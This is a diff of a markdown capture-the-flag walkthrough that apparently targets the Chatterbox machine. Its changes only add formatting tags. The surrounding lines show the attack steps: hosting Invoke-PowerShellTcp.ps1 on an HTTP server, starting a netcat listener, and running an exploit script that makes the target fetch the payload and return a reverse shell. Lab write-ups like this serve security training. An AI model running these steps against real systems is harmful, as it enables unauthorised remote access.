@@ -146,13 +146,16 @@ Once you have updated this script (I downloaded it as it s defauly file name `36
 ```bash
 t3lesph0re@neptune:~$ python3 -m http.server 80
 ```
-{: .wraplong }
+
+{:.wraplong }
 
 2. Start the listener:
 
 ```bash
 t3lesph0re@neptune:~$ nc -lnvp 8082
 ```
+
+{:.wraplong }
 
 3. Run the Python script:
 
@@ -161,6 +164,8 @@ Because the script shebang shows **#!/usr/bin/python**, we will use **Python2**:
 ```bash
 t3lesph0re@neptune:~$ python2 36025
 ```
+
+{:.wraplong }
 
 The Python script will run and you will see that the **Invoke-PowerShellTcp.ps1** was grabbed from the Python HTTP server (`10.10.10.74 - - [14/Oct/2025 19:09:22] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -`). Additionally, the script will output its `---->{P00F}!` and you will get your reverse shell for the user **chatterbox\alfred**. 
 
